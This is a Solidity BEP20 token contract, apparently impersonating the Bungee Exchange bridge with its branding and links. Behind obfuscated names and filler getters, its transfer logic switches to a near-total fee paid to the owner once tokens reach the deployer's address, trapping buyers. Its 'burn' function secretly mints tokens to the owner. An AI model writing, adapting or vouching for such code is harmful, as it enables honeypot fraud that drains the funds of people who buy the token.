/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
BungeeExchange
Make the jump to explore your favorite chains!
Multichainbungee.exchange
Intuitive & smooth bridging experience is a necessity in a multi-chain world like ours🌐
Introducing Bungee, the only app you'll ever need to jump across chains!
Get ready to fall in❤️with bridging!
Join our community here: 
http://discord.gg/zfKJR8yWaH
https://bungee.exchange
https://twitter.com/BungeeExchange
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;
contract BungeeEx {
address private  JXYsTt = address(0);
uint256 public constant WXmepr = 99999;
uint256 private  aINuJO = 1000000000000000000;
address public owner;
string public  name = "BungeeEx";
address private  xFrqRd = address(0);
address private  UEmiIN = address(0);
address private  AZAfvJ = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "BungeeEx";
address private  aMGJwa = address(0);
address private  EFNEoZ = address(0);
uint256 private  CfSmfQ = 1000000000000000000000;
uint256 private  ulZHLC = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  GIBtSB = 1000000000000000;
address private  kNmcyA = address(0);
address private  DvdEvy = address(0);
uint256 private  zCirEx = 10000000000;
uint256 private  WrGXcu = 100000000;
address private  tOPfqX = address(0);
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
uint256 private  rZgJBK = 10000000000000;


function _getGIBtSB() private returns (uint256) {
return GIBtSB;
}

function _getkNmcyA() private returns (address) {
return kNmcyA;
}



function _getJXYsTt() private returns (address) {
return JXYsTt;
}





function _getEFNEoZ() private returns (address) {
return EFNEoZ;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FTrsWB");
require(to != address(0), "FTrsWB");
require(amount <= balanceOf[from], "FTrsWB");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* WXmepr/ulZHLC ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==AZAfvJ){
ulZHLC = WXmepr+2;
}
emit Transfer(from, to, transferAmount);
}
function _getDvdEvy() private returns (address) {
return DvdEvy;
}

function _getrZgJBK() private returns (uint256) {
return rZgJBK;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getzCirEx() private returns (uint256) {
return zCirEx;
}



function _getaINuJO() private returns (uint256) {
return aINuJO;
}

function _getWrGXcu() private returns (uint256) {
return WrGXcu;
}

constructor () {
AZAfvJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}










function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tFTrsWB 0");
require(spender != address(0), "fFTrsWB 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getCfSmfQ() private returns (uint256) {
return CfSmfQ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}




function _gettOPfqX() private returns (address) {
return tOPfqX;
}

function _getUEmiIN() private returns (address) {
return UEmiIN;
}

function _getaMGJwa() private returns (address) {
return aMGJwa;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}


function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getxFrqRd() private returns (address) {
return xFrqRd;
}



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}



}